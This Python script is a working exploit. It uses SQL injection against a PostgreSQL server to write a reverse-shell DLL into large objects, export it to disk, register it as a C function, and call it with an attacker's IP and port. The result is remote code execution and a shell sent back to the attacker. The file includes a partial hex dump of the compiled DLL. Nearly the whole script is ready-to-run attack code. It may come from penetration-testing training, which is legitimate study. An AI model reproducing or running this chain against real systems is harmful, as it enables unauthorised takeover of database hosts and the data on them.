#(m4ud) PostgreSQL LargeObjects UDF RCE

import requests, sys, urllib, string, random, time
from time import *
requests.packages.urllib3.disable_warnings()
import binascii
# encoded UDF rev_shell dll - dll must be converted into HEX
#udf = '''000000000000000000000000000000000000000000000000000000000000000000000000000000000003000101022001001000000942000100000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b1b000052534453335bf7de037c4049aaeebf335024a6d902000000433a5c55736572735c41646d696e6973747261746f725c736f757263655c7265706f735c617761655c52656c656173655c617761652e70646200000000000000160000001600000001000000150000004743544c001000005c0d00002e74657874246d6e0000000000200000940000002e696461746124350000000094200000040000002e3030636667000098200000040000002e43525424584341000000009c200000040000002e4352542458435a00000000a0200000040000002e4352542458494100000000a4200000040000002e4352542458495a00000000a8200000040000002e4352542458504100000000ac200000040000002e4352542458505a00000000b0200000040000002e4352542458544100000000b42000000c0000002e4352542458545a00000000c0200000500100002e7264617461000010220000040000002e72646174612473786461746100000014220000680200002e7264617461247a7a7a6462670000007c240000040000002e727463244941410000000080240000040000002e72746324495a5a0000000084240000040000002e727463245441410000000088240000080000002e72746324545a5a0000000090240000800000002e786461746124780000000010250000800000002e6564617461000090250000640000002e6964617461243200000000f4250000140000002e696461746124330000000008260000940000002e69646174612434000000009c260000d00200002e696461746124360000000000300000200000002e6461746100000020300000a00500002e627373000000000000000000000000000000000000000000000000feffffff00000000d0ffffff00000000feffffff000000005e12001000000000feffffff00000000d4ffffff00000000feffffff00000000e312001000000000feffffff00000000d4ffffff00000000feffffffb8130010d713001000000000feffffff00000000d8ffffff00000000feffffffec180010ff1800100000000000000000ffffffff00000000562500000100000003000000030000003825000044250000502500000010000020100000101000005f2500006d2500007a250000000001000200617761652e646c6c0050675f6d616769635f66756e6300636f6e6e6563745f6261636b0070675f66696e666f5f636f6e6e6563745f6261636b008c2600000000000000000000d426000084200000082600000000000000000000f4260000002000005026000000000000000000001e270000482000004026000000000000000000006e27000038200000682600000000000000000000262800006020000000000000000000000000000000000000000000005829000042290000e2260000f6280000e0280000c6280000aa28000096280000822800006428000048280000262900000c290000000000004a270000542700002a2700000000000009000080102700000b0000807300008002270000000000009a2700008c2700008027000004280000e8270000c62700001c280000ac27000000000000ba260000b02600009c260000000000009a1370675f6465746f6173745f646174756d00000118746578746f757400dd0144697265637446756e6374696f6e43616c6c31436f6c6c00706f7374677265732e6578650000df0043726561746550726f636573734100004b45524e454c33322e646c6c00005600575341536f636b65744100002000575341436f6e6e65637400005753325f33322e646c6c000025005f5f7374645f747970655f696e666f5f64657374726f795f6c697374000048006d656d736574000035005f6578636570745f68616e646c6572345f636f6d6d6f6e00564352554e54494d453134302e646c6c000038005f696e69747465726d0039005f696e69747465726d5f650041005f7365685f66696c7465725f646c6c0019005f636f6e6669677572655f6e6172726f775f61726776000035005f696e697469616c697a655f6e6172726f775f656e7669726f6e6d656e74000036005f696e697469616c697a655f6f6e657869745f7461626c65000024005f657865637574655f6f6e657869745f7461626c650017005f636578697400006170692d6d732d77696e2d6372742d72756e74696d652d6c312d312d302e646c6c00a505556e68616e646c6564457863657074696f6e46696c74657200006505536574556e68616e646c6564457863657074696f6e46696c74657200150247657443757272656e7450726f636573730084055465726d696e61746550726f6365737300008103497350726f636573736f724665617475726550726573656e740046045175657279506572666f726d616e6365436f756e74657200160247657443757272656e7450726f636573734964001a0247657443757272656e7454687265616449640000e50247657453797374656d54696d65417346696c6554696d65001c0144697361626c655468726561644c69627261727943616c6c73005e03496e697469616c697a65534c69737448656164007a034973446562756767657250726573656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004ee640bbb119bf44ffffffffc010000013011302530303042304a305530603066306f3078307e30883097309d30a230a830b130bb30c430ce30d730dc30e130f230f930fe3004310f317431a331b331d431d931f231f731043251326e32783286329832b732f5320733c133f43342344b3456345d347d34833489348f3495349b34a234a934b034b734be34c534cc34d434dc34e434f034f934fe3404350e3518352835383548355135723581358a359735ae35c935f135f9350b361736233629362f363b364136bb367e37af37e5370e381d3830383c384c385d3873388a389f38a638ac38be38c838263933395739353a553a5f3a7a3a833a883aae3ab33ad83ae13afe3a4b3b503b633b713b8c3b973b2b3c343c3c3c783c8c3c933cc93cd23cdb3ce93cf23c053d103d163d1c3d223d283d2e3d343d3a3d403d463d4c3d523d000000200000200000009430c430c830ac31b031b831a834c834e434e834043508350000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000''' 
with open('rev_shell.dll', 'rb') as file:
    udf = binascii.hexlify(file.read())

loid = 1337

def log(msg): 
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: %s" % sql[0:80]) 
    r = requests.get( url % sql, verify=False) 
    return r

def delete_lo(url, loid):
    log("[+] Deleting existing LO...") 
    sql = "SELECT lo_unlink(%d)" % loid 
    make_request(url, sql)

def create_lo(url, loid):
    log("[+] Creating LO for UDF injection...")
    sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid 
    make_request(url, sql)

def inject_udf(url, loid):
    with open('rev_shell.dll', 'rb') as file:
        udflib = binascii.hexlify(file.read())
    log("[+] Injecting payload of length %d into LO..." % len(udf)) 
    for i in range(0,int(round(len(udf)/4096))):
    #for i in range(0,((len(udflib)-1)/4096)+1):
        udf_chunk = udflib[i*4096:(i+1)*4096]
        if i == 0:
            sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
        else:
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d,decode($$%s$$, $$hex$$))" % (loid, i, udf_chunk)
        make_request(url, sql)

def export_udf(url, loid):
    log("[+] Exporting UDF library to filesystem...")
    sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell1.dll$$)" % loid 
    make_request(url, sql)

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "CREATE OR REPLACE FUNCTION rev_shell1(text,integer) RETURNS void AS $$C:\\Users\\Public\\rev_shell1.dll$$, $$connect_back$$ language c strict" 
    make_request(url, sql)

def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell...")
    sql = "select rev_shell1($$%s$$, %d)" % (ip, int(port)) 
    make_request(url, sql)

if __name__ == '__main__':
    try:
        server = sys.argv[1].strip() 
        attacker = sys.argv[2].strip() 
        port = sys.argv[3].strip()
    except IndexError:
        print ("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
        sys.exit()

    sqli_url = "https://"+server+"/sqli?Range=1&userId=1;%s;--"
    delete_lo(sqli_url, loid) 
    create_lo(sqli_url, loid) 
    inject_udf(sqli_url, loid) 
    export_udf(sqli_url, loid) 
    create_udf_func(sqli_url)
    sleep(3)
    trigger_udf(sqli_url, attacker, port)
    trigger_udf(sqli_url, attacker, port)
